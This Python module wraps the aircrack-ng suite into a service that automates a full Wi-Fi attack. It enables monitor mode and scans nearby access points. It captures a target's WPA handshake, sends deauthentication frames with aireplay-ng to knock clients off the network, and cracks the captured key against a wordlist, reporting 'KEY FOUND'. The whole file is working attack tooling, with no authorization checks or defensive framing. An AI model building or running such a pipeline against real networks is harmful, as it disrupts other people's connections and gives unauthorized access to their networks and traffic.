"""High-level wrappers around the aircrack-ng suite."""

from __future__ import annotations

import os
import re
import threading
import time
from collections.abc import Callable
from datetime import datetime
from pathlib import Path
from typing import Optional

from app.core import parsers
from app.core.process_runner import ProcessRunner
from app.core.state import SessionState, Station

REQUIRED_BINARIES = [
    "airmon-ng",
    "airodump-ng",
    "aireplay-ng",
    "aircrack-ng",
]

OnLine = Callable[[str], None]
OnDone = Callable[[int], None]


class AircrackService:
    def __init__(
        self,
        state: SessionState,
        *,
        captures_dir: Optional[Path] = None,
        log: Optional[OnLine] = None,
    ) -> None:
        self.session = state
        self.log = log or (lambda _msg: None)
        root = Path(__file__).resolve().parents[2]
        self.captures_dir = captures_dir or (root / "captures")
        self.captures_dir.mkdir(parents=True, exist_ok=True)

        self._scan_runner = ProcessRunner()
        self._capture_runner = ProcessRunner()
        self._deauth_runner = ProcessRunner()
        self._crack_runner = ProcessRunner()
        self._helper = ProcessRunner()

        self._scan_prefix: Optional[Path] = None
        self._capture_prefix: Optional[Path] = None
        self._handshake_stop_scheduled = False

    # ------------------------------------------------------------------ utils
    def missing_binaries(self) -> list[str]:
        return parsers.which_missing(REQUIRED_BINARIES)

    def is_root(self) -> bool:
        if hasattr(os, "geteuid"):
            return os.geteuid() == 0
        return False

    def _emit(self, msg: str) -> None:
        self.log(msg)

    def stop_all(self) -> None:
        for runner in (
            self._scan_runner,
            self._capture_runner,
            self._deauth_runner,
            self._crack_runner,
        ):
            runner.stop(force=True)

    # ------------------------------------------------------------- interfaces
    def list_interfaces(self) -> list[str]:
        code, out = self._helper.run_capture(["iwconfig"])
        ifaces = parsers.parse_wireless_interfaces(out)
        if not ifaces:
            code2, out2 = self._helper.run_capture(["ip", "link", "show"])
            ifaces = parsers.parse_ip_link_wireless_hint(out2)
            if code2 != 0 and not ifaces:
                self._emit(out2.strip() or "Failed to list interfaces via ip link")
        if code != 0 and "no wireless extensions" not in out.lower() and not ifaces:
            # iwconfig exits non-zero sometimes when some ifaces lack wireless
            pass
        # Include current monitor iface if known
        mon = self.session.monitor_interface
        if mon and mon not in ifaces:
            ifaces.append(mon)
        return sorted(set(ifaces))

    # ----------------------------------------------------------- monitor mode
    def check_kill(self) -> tuple[bool, str]:
        self._emit("Running: airmon-ng check kill")
        code, out = self._helper.run_capture(["airmon-ng", "check", "kill"])
        self._emit(out.strip() or "(no output)")
        return code == 0, out

    def start_monitor(
        self,
        interface: str,
        *,
        auto_check_kill: bool = True,
    ) -> tuple[bool, str, Optional[str]]:
        # Already in monitor? Don't re-run airmon (avoids churn / NM fights).
        existing = self._discover_monitor_iface(preferred=interface)
        if existing:
            self.session.interface = interface
            self.session.monitor_interface = existing
            msg = f"Monitor mode already active on {existing}"
            self._emit(msg)
            return True, msg, existing

        if auto_check_kill:
            self._emit(
                "Auto check kill: stopping NetworkManager / wpa_supplicant "
                "(required for reliable scanning)"
            )
            self.check_kill()

        self._emit(f"Running: airmon-ng start {interface}")
        code, out = self._helper.run_capture(["airmon-ng", "start", interface])
        self._emit(out.strip() or "(no output)")
        mon = parsers.parse_airmon_monitor_iface(out)

        # Bare "(monitor mode enabled)" with no iface name → use selected iface
        if not mon and parsers.AIRMON_ENABLED_BARE_RE.search(out or ""):
            mon = interface

        if not mon:
            mon = self._discover_monitor_iface(preferred=interface)

        if not mon:
            self._emit(
                "airmon-ng did not report a clear monitor iface; "
                f"trying iw fallback on {interface}…"
            )
            ok_iw, iw_out = self._enable_monitor_via_iw(interface)
            out = (out or "") + "\n" + iw_out
            if ok_iw:
                mon = interface

        if not mon:
            mon = self._discover_monitor_iface(preferred=interface)

        if mon:
            # Ensure the iface is administratively up
            self._helper.run_capture(["ip", "link", "set", mon, "up"])
            self.session.interface = interface
            self.session.monitor_interface = mon
            self._emit(f"Monitor interface: {mon}")
            return True, out, mon
        return False, out or "Could not determine monitor interface", None

    def prepare_for_scan(self) -> None:
        """Re-assert monitor mode and kill interferers before airodump."""
        mon = self.session.monitor_interface
        if not mon:
            raise RuntimeError("Monitor interface not set. Enable monitor mode first.")

        # NM often restarts and breaks rtl8xxxu monitor mode mid-session
        code, check_out = self._helper.run_capture(["airmon-ng", "check"])
        if re.search(r"NetworkManager|wpa_supplicant|dhclient", check_out or "", re.I):
            self._emit(
                "Interfering processes detected — running check kill before scan"
            )
            self.check_kill()

        still = self._discover_monitor_iface(preferred=mon)
        if not still:
            self._emit(f"Monitor mode lost on {mon}; re-enabling…")
            iface = self.session.interface or mon
            ok, _out, new_mon = self.start_monitor(iface, auto_check_kill=True)
            if not ok or not new_mon:
                raise RuntimeError(
                    "Could not restore monitor mode. Click Check kill, then Start monitor."
                )
            mon = new_mon

        self._helper.run_capture(["ip", "link", "set", mon, "up"])
        self.session.monitor_interface = mon


    def _discover_monitor_iface(self, preferred: Optional[str] = None) -> Optional[str]:
        """Find an interface already in monitor mode via iw/iwconfig."""
        code, iw_out = self._helper.run_capture(["iw", "dev"])
        mons = parsers.parse_iw_monitor_interfaces(iw_out) if code == 0 or iw_out else []
        if preferred and preferred in mons:
            return preferred
        if mons:
            return mons[0]

        # iwconfig fallback
        _c, iwc = self._helper.run_capture(["iwconfig"])
        if preferred and parsers.iface_is_monitor(iwc, preferred):
            return preferred
        ifaces = parsers.parse_wireless_interfaces(iwc)
        for name in ifaces:
            if parsers.iface_is_monitor(iwc, name):
                return name
        guess = None
        if preferred:
            guess = f"{preferred}mon" if not preferred.endswith("mon") else preferred
            if guess in ifaces:
                return guess
        for name in ifaces:
            if name.endswith("mon"):
                return name
        return None

    def _enable_monitor_via_iw(self, interface: str) -> tuple[bool, str]:
        """Set type monitor with iw (works on many mac80211 Realtek sticks)."""
        logs: list[str] = []
        for cmd in (
            ["ip", "link", "set", interface, "down"],
            ["iw", "dev", interface, "set", "type", "monitor"],
            ["ip", "link", "set", interface, "up"],
        ):
            self._emit("Running: " + " ".join(cmd))
            code, out = self._helper.run_capture(cmd)
            chunk = out.strip() or f"(exit {code})"
            logs.append(" ".join(cmd) + " -> " + chunk)
            self._emit(chunk)
            if code != 0 and "set type monitor" in " ".join(cmd):
                return False, "\n".join(logs)

        # Confirm
        mon = self._discover_monitor_iface(preferred=interface)
        if mon:
            return True, "\n".join(logs)
        return False, "\n".join(logs) + "\nMonitor mode not confirmed after iw fallback"

    def stop_monitor(self, mon_iface: Optional[str] = None) -> tuple[bool, str]:
        target = mon_iface or self.session.monitor_interface
        if not target:
            return False, "No monitor interface set"
        self._emit(f"Running: airmon-ng stop {target}")
        code, out = self._helper.run_capture(["airmon-ng", "stop", target])
        self._emit(out.strip() or "(no output)")
        restored = parsers.parse_airmon_disabled_iface(out)

        # If still in monitor (airmon no-op / same-iface Realtek), restore via iw
        still = self._discover_monitor_iface(preferred=target)
        if still == target:
            self._emit(f"Trying iw managed restore on {target}…")
            for cmd in (
                ["ip", "link", "set", target, "down"],
                ["iw", "dev", target, "set", "type", "managed"],
                ["ip", "link", "set", target, "up"],
            ):
                c, o = self._helper.run_capture(cmd)
                self._emit((o.strip() or f"(exit {c})"))
            restored = restored or target

        self.session.monitor_interface = None
        if restored:
            self.session.interface = restored
        elif self.session.interface is None:
            self.session.interface = target
        return True, out

    # ------------------------------------------------------------------- scan
    @property
    def scanning(self) -> bool:
        return self._scan_runner.running

    def start_scan(
        self,
        *,
        on_line: Optional[OnLine] = None,
        on_done: Optional[OnDone] = None,
    ) -> Path:
        self.prepare_for_scan()
        mon = self.session.monitor_interface
        assert mon is not None

        self.stop_scan()
        self.session.reset_scan()

        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        prefix = self.captures_dir / f"scan_{stamp}"
        self._scan_prefix = prefix
        csv_path = Path(f"{prefix}-01.csv")
        self.session.scan_csv_path = csv_path

        # --band bg: 2.4 GHz only (RTL8188EUS); avoids odd CH14 hopping noise
        cmd = [
            "airodump-ng",
            "--band",
            "bg",
            "--write-interval",
            "1",
            "-w",
            str(prefix),
            "--output-format",
            "csv",
            mon,
        ]
        self._emit("Starting scan: " + " ".join(cmd))
        self._emit("AP list updates from CSV (airodump TUI spam is hidden).")

        def _line(line: str) -> None:
            # Never flood the GUI with curses escape sequences
            if on_line and parsers.is_useful_airodump_log_line(line):
                on_line(parsers.strip_ansi(line).strip())

        def _done(code: int) -> None:
            self._emit(f"Scan process exited ({code})")
            if on_done:
                on_done(code)

        # Discard most TUI output: still start reader so the pipe doesn't fill
        self._scan_runner.start(cmd, on_line=_line, on_done=_done)
        return csv_path

    def stop_scan(self) -> None:
        if self._scan_runner.running:
            self._emit("Stopping scan...")
            self._scan_runner.stop()

    def refresh_scan_results(self) -> tuple[list[AccessPoint], list[Station]]:
        path = self.session.scan_csv_path
        if not path:
            return [], []
        # airodump may still be writing; retry briefly
        aps, stas = [], []
        for _ in range(3):
            aps, stas = parsers.parse_airodump_csv_file(path)
            if aps or stas:
                break
            time.sleep(0.2)
        self.session.access_points = aps
        self.session.stations = stas
        return aps, stas

    def stations_for_ap(self, bssid: str) -> list[Station]:
        bssid_l = bssid.lower()
        return [
            s
            for s in self.session.stations
            if s.bssid.lower() == bssid_l and s.bssid.lower() != "(not associated)"
        ]

    # ---------------------------------------------------------------- capture
    @property
    def capturing(self) -> bool:
        return self._capture_runner.running

    def start_capture(
        self,
        *,
        on_line: Optional[OnLine] = None,
        on_done: Optional[OnDone] = None,
        on_handshake: Optional[Callable[[], None]] = None,
    ) -> Path:
        self.stop_capture()
        self.session.handshake_ready = False
        self.session.cracked_key = None
        self._handshake_stop_scheduled = False

        self.prepare_for_scan()
        mon = self.session.monitor_interface
        ap = self.session.selected_ap
        if not mon:
            raise RuntimeError("Monitor interface not set")
        if not ap:
            raise RuntimeError("No access point selected")
        channel = (ap.channel or "").strip()
        if not channel or channel == "-1":
            raise RuntimeError("Selected AP has no valid channel")

        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_essid = re.sub(r"[^\w\-]+", "_", ap.essid or "unknown")[:32]
        prefix = self.captures_dir / f"cap_{safe_essid}_{stamp}"
        self._capture_prefix = prefix
        self.session.capture_prefix = str(prefix)
        cap_path = Path(f"{prefix}-01.cap")
        self.session.capture_cap_path = cap_path

        cmd = [
            "airodump-ng",
            "--write-interval",
            "1",
            "-c",
            channel,
            "--bssid",
            ap.bssid,
            "-w",
            str(prefix),
            mon,
        ]
        self._emit("Starting capture: " + " ".join(cmd))

        def _line(line: str) -> None:
            clean = parsers.strip_ansi(line).strip()
            if on_line and parsers.is_useful_airodump_log_line(line):
                on_line(clean)
            hs = parsers.handshake_from_airodump_line(clean)
            if hs:
                self._mark_handshake(
                    reason=f"airodump: {hs}",
                    on_handshake=on_handshake,
                    auto_stop=True,
                )

        def _done(code: int) -> None:
            self._emit(f"Capture process exited ({code})")
            if not self.session.handshake_ready:
                if self.probe_handshake(auto_stop=False):
                    if on_handshake:
                        on_handshake()
            if on_done:
                on_done(code)

        self._capture_runner.start(cmd, on_line=_line, on_done=_done)
        return cap_path

    def _mark_handshake(
        self,
        *,
        reason: str,
        on_handshake: Optional[Callable[[], None]] = None,
        auto_stop: bool = True,
    ) -> None:
        first = not self.session.handshake_ready
        self.session.handshake_ready = True
        if first:
            self._emit(f"Handshake detected ({reason})")
            if on_handshake:
                on_handshake()
        if auto_stop:
            self._schedule_auto_stop_capture()

    def _schedule_auto_stop_capture(self) -> None:
        """Stop airodump shortly after handshake so the .cap can flush."""
        if getattr(self, "_handshake_stop_scheduled", False):
            return
        if not self._capture_runner.running:
            return
        self._handshake_stop_scheduled = True
        self._emit("Handshake ready — stopping capture automatically…")

        def _stop_soon() -> None:
            # Give airodump time to flush EAPOL frames to the .cap
            time.sleep(3.5)
            if self._deauth_runner.running:
                self._deauth_runner.stop(force=True)
            if self._capture_runner.running:
                self.stop_capture()
                self._emit("Capture stopped (handshake captured)")

        threading.Thread(target=_stop_soon, daemon=True).start()

    def stop_capture(self) -> None:
        if self._capture_runner.running:
            self._emit("Stopping capture...")
            self._capture_runner.stop()

    def deauth(
        self,
        *,
        count: int = 5,
        on_line: Optional[OnLine] = None,
        on_done: Optional[OnDone] = None,
    ) -> None:
        mon = self.session.monitor_interface
        ap = self.session.selected_ap
        client = self.session.selected_client
        if not mon or not ap:
            raise RuntimeError("Monitor interface and AP required for deauth")

        cmd = ["aireplay-ng", "-0", str(count), "-a", ap.bssid]
        if client and client.station_mac:
            cmd.extend(["-c", client.station_mac])
        cmd.append(mon)

        self._emit("Deauth: " + " ".join(cmd))

        def _line(line: str) -> None:
            self._emit(line)
            if on_line:
                on_line(line)

        self._deauth_runner.start(cmd, on_line=_line, on_done=on_done)

    def probe_handshake(self, *, auto_stop: bool = True) -> bool:
        cap = self.session.capture_cap_path
        if not cap or not cap.exists():
            return False
        code, out = self._helper.run_capture(
            ["aircrack-ng", str(cap)],
            timeout=30,
        )
        ready = parsers.aircrack_reports_handshake(out)
        if ready:
            self._mark_handshake(
                reason="aircrack-ng probe",
                auto_stop=auto_stop and self.capturing,
            )
        return ready

    # ------------------------------------------------------------------- crack
    @property
    def cracking(self) -> bool:
        return self._crack_runner.running

    def start_crack(
        self,
        wordlist: Path,
        *,
        on_line: Optional[OnLine] = None,
        on_done: Optional[Callable[[int, Optional[str]], None]] = None,
    ) -> None:
        cap = self.session.capture_cap_path
        ap = self.session.selected_ap
        if not cap or not cap.exists():
            raise RuntimeError(f"Capture file not found: {cap}")
        if not wordlist.exists():
            raise RuntimeError(f"Wordlist not found: {wordlist}")
        if not ap:
            raise RuntimeError("No AP selected")

        self.session.wordlist_path = wordlist
        self.session.cracked_key = None

        cmd = ["aircrack-ng", "-w", str(wordlist), "-b", ap.bssid, str(cap)]
        self._emit("Cracking: " + " ".join(cmd))

        buffer: list[str] = []

        def _line(line: str) -> None:
            buffer.append(line)
            key = parsers.parse_aircrack_key(line)
            if key:
                self.session.cracked_key = key
                self._emit(f"KEY FOUND: {key}")
            if on_line:
                on_line(line)

        def _done(code: int) -> None:
            joined = "\n".join(buffer)
            if not self.session.cracked_key:
                key = parsers.parse_aircrack_key(joined)
                if key:
                    self.session.cracked_key = key
            self._emit(f"Crack process exited ({code})")
            if on_done:
                on_done(code, self.session.cracked_key)

        self._crack_runner.start(cmd, on_line=_line, on_done=_done)

    def stop_crack(self) -> None:
        if self._crack_runner.running:
            self._emit("Stopping crack...")
            self._crack_runner.stop()

    def tool_hint(self) -> str:
        missing = self.missing_binaries()
        if not missing:
            return ""
        return (
            "Missing tools: "
            + ", ".join(missing)
            + "\nInstall with: sudo apt install aircrack-ng"
        )
